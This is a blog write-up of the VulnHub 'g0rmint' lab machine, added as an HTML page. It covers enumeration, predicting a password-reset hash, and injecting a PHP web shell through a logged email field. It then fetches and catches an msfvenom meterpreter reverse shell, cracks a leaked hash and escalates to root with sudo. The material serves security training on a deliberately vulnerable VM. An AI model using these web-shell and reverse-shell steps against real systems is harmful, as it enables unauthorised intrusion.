@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+      <!-- Enable responsiveness on mobile devices-->
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+      <title>m4l1c3.github.io</title>
+
+      
+        <link rel="alternate" type="application/atom+xml" title="RSS" href="https://m4l1c3.github.io/atom.xml">
+      
+
+      
+          <link rel="stylesheet" href="https://m4l1c3.github.io/site.css">
+      
+
+      
+      
+    </head>
+
+    <body class="hack dark main container">
+        
+    
+        
+                
+                    <header>
+                        <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io">
+                                <span itemprop="name">Home
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io&#x2F;categories">
+                                <span itemprop="name">Categories
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io&#x2F;tags">
+                                <span itemprop="name">Tags
+                                </span></a>
+                        
+                            <a itemprop="url"
+                               class=""
+                               href="https:&#x2F;&#x2F;m4l1c3.github.io&#x2F;atom.xml">
+                                <span itemprop="name">Feed
+                                </span></a>
+                        
+                        </nav>
+                    </header>
+                
+            
+    
+
+<article itemscope itemtype="http://schema.org/BlogPosting">
+    <header>
+        <h1 itemprop="headline">g0rmint</h1>
+        <span class="muted">
+    <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <circle cx="16" cy="16" r="14"/>
+        <path d="M16 8 L16 16 20 20"/>
+    </svg>
+    <span>5 minute read</span>
+    <svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32"
+         width="16" height="16" fill="none" stroke="currentcolor"
+         stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+        <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z"/>
+    </svg>
+
+    Published: 2018-01-11
+</span>
+    </header>
+    <div itemprop="articleBody">
+      <h1 id="g04mint">g04mint</h1>
+<p>First off, find the box:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">netdiscover -r 192.168.171.0/24
+
+Currently scanning: Finished!   |   Screen View: Unique Hosts
+
+3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
+_____________________________________________________________________________
+IP            At MAC Address     Count     Len  MAC Vendor / Hostname
+-----------------------------------------------------------------------------
+192.168.171.1   00:50:56:c0:00:01      1      60  VMware, Inc.
+192.168.171.138 00:0c:29:1f:ad:4c      1      60  VMware, Inc.
+192.168.171.254 00:50:56:fa:32:59      1      60  VMware, Inc.
+
+</code></pre>
+<p>Scan with nmap:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">nmap -T4 -A -oA g0rmint  192.168.171.138
+</code></pre>
+<p>Looks like 22 and 80 are open, not a lot to go on...</p>
+<p>Accessing the server on port 80 returns a 404 page, better try for a robots.txt and find this:</p>
+<p>/* Too easy? Lets see <em>/
+Disallow: /g0rmint/</em></p>
+<p>Now I'm faced with a login page and nothing to go on, however the following showed up in the login page's markup:</p>
+<pre data-lang="html" class="language-html "><code class="language-html" data-lang="html"><meta name="backup-directory" content="s3cretbackupdirect0ry">
+</code></pre>
+<p>Next run dirb to try and find hidden content, nothing really popped up.</p>
+<p>I tried fuzzing a bunch of mobile user agents to see if this meta tag somehow triggers a different page response as well as brute forcing the login/reset forms, nothing seemed to be working.</p>
+<p>Then I remembered I need to try force browsing that directory now that new file system elements exist:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">
+dirb http://192.168.171,138/g0rmint/s3crebackupdirect0ry -i -l
+
+</code></pre>
+<p>This found an info.php file which shows backup.zip, lets download that and take a look</p>
+<p>A few interesting things here, first the config file has a function for writing PHP files out to the server, and the login page calls this storing the email form field in the generated PHP.</p>
+<pre data-lang="php" class="language-php "><code class="language-php" data-lang="php">
+function addlog($log, $reason) {
+    $myFile = "s3cr3t-dir3ct0ry-f0r-l0gs/" . date("Y-m-d") . ".php";
+    if (file_exists($myFile)) {
+        $fh = fopen($myFile, 'a');
+        fwrite($fh, $reason . $log . "<br>\n");
+    } else {
+        $fh = fopen($myFile, 'w');
+        fwrite($fh, file_get_contents("dummy.php") . "<br>\n");
+        fclose($fh);
+        $fh = fopen($myFile, 'a');
+        fwrite($fh, $reason . $log . "<br>\n");
+    }
+    fclose($fh);
+}
+
+</code></pre>
+<p>Next looking at the register page if we know a legit user/email combination the user's password will be reset to the first 20 characters of a sha1 hash of the current date/time in GMT, which luckily gets printed to the page each time you reload or submit a postback.</p>
+<p>After a lot of banging my head I finally learned a vital piece I'm usually missing during enumeration, in this case we need an email.  What I'm finally learning is I should be searching better any time I have a known input, in this case the email can be searched for in all this source code:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">
+grep -i -r -E -o "\b[a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9.-]+\b" *
+Binary file backup.zip matches
+css/font-awesome.min.css:dave@davegandy.com
+css/style.css:w3bdrill3r@gmail.com
+css/style.css:timeline-left-arrow@2x.png
+css/style.css:timeline-right-arrow@2x.png
+css/style.css:chat-left@2x.png
+css/style.css:chat-right@2x.png
+css/style.css:chat-left-metro@2x.png
+css/style.css:chat-right-metro@2x.png
+css/font-awesome-ie7.min.css:dave@davegandy.com
+db.sql:demo@example.com
+Binary file img/gallery/photo5.jpg matches
+js/jquery.elfinder.min.js:troex@fury.scancode.ru
+js/jquery.elfinder.min.js:dio@std42.ru
+js/jquery.elfinder.min.js:troex@fury.scancode.ru
+js/jquery.elfinder.min.js:strogg@yandex.ru
+js/jquery.elfinder.min.js:hypweb@gmail.com
+
+</code></pre>
+<p>Now to review all the files, style.css seems like a good starting point, thats usually the place an author or developer would put their CSS for a site/app.</p>
+<pre data-lang="css" class="language-css "><code class="language-css" data-lang="css">
+/*
+* Author: noman
+* Author Email: w3bdrill3r@gmail.com
+* Version: 1.0.0
+* g0rmint: Bik gai hai
+* Copyright: Aunty g0rmint
+* www: http://g0rmint.com
+* Site managed and developed by author himself
+*/
+
+</code></pre>
+<p>Right in plain site, it even states the manager/developer/admin as this person.</p>
+<p>Now to get our password, time to generate our hash:</p>
+<pre data-lang="php" class="language-php "><code class="language-php" data-lang="php">
+substr(hash('sha1', 'date time string from the page load'), 0, 20);
+
+</code></pre>
+<p>and we have our password.</p>
+<p>With the amount of time that elapsed getting this far I had completely forgotten about the addslashes call in config.php which lead to me wasting hours trying to get decent code execution going.  Once I reviewed the code again getting execution was pretty straightforward:</p>
+<pre data-lang="php" class="language-php "><code class="language-php" data-lang="php">
+<?php echo shell_exec(base64decode($_GET[cmd])); ?> 
+
+</code></pre>
+<p>as our email and we can start sending commands.</p>
+<p>Now to generate a wget command to pull down a reverse_tcp shell:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">
+msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.171.136 LPORT=4444 R > shell.php
+echo 'wget http://192.168.171.36:8000/shell.php' | base64
+d2dldCBodHRwOi8vMTkyLjE2OC4xNzEuMzY6ODAwMC9zaGVsbC5waHAK==
+python -m SimpleHTTPServer
+Serving HTTP on 0.0.0.0 port 8000 ...
+192.168.171.138 - - [17/Jan/2018 22:32:39] "GET /shell.php HTTP/1.1" 200 -
+</code></pre>
+<p>Now to setup metasploit to handle the callback:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">
+screen -S msf msfconsole
+
+msf > use exploit/multi/handler
+msf exploit(handler) > show options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf exploit(handler) > set LHOST 192.168.171.136
+LHOST => 192.168.171.136
+msf exploit(handler) > set LPORT 4444
+LPORT => 4444
+
+set PAYLOAD php/meterpreter/reverse_tcp
+
+</code></pre>
+<p>Then request our webshell, and we have a meterpreter session running.</p>
+<p>Once connected I grabbed and ran LinEnum from rebootuser in hopes of finding something juicy.  Once I had the output I started parsing through and searched for vulns in the kernel, mysql, apache. logs, binaries, etc. and having nothing work.  Then took a look around and saw another backup.zip, extract and get this difference:</p>
+<pre data-lang="sql" class="language-sql "><code class="language-sql" data-lang="sql">INSERT INTO `g0rmint` (`id`, `username`, `email`, `pass`) VALUES
+(1, 'noman', 'w3bdrill3r@gmail.com', 'ea60b43e48f3c2de55e4fc89b3da53dc');
+</code></pre>
+<p>Then crack the hash and get: tayyab123</p>
+<p>Now to try ssh with the g0rmint user in /etc/passwd and get a login, run sudo -l:</p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">g0rmint@ubuntu:~$ sudo -l
+[sudo] password for g0rmint:
+Matching Defaults entries for g0rmint on ubuntu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User g0rmint may run the following commands on ubuntu:
+    (ALL : ALL) ALL
+</code></pre>
+<p>Looks like we're done: </p>
+<pre data-lang="bash" class="language-bash "><code class="language-bash" data-lang="bash">
+g0rmint@ubuntu:~$ sudo su
+root@ubuntu:/home/g0rmint# ls /root
+flag.txt
+root@ubuntu:/home/g0rmint# cat /root/flag.txt
+Congrats you did it :)
+Give me feedback @nomanriffat
+root@ubuntu:/home/g0rmint#
+
+</code></pre>
+
+    </div>
+
+    
+        <footer>
+            <hr>
+            <p>
+                
+                    Published by m4l1c3
+                
+                
+                    
+                    in <a href="https://m4l1c3.github.io/categories/vulnhub/">vulnhub</a>
+                
+                
+                    and tagged
+                    
+                        <a href="https://m4l1c3.github.io/tags/vulnerable-machine/">vulnerable-machine</a>
+                        
+                    
+                
+            </p>
+            
+            
+        </footer>
+    
+</article>
+
+
+    </body>
+
+</html>
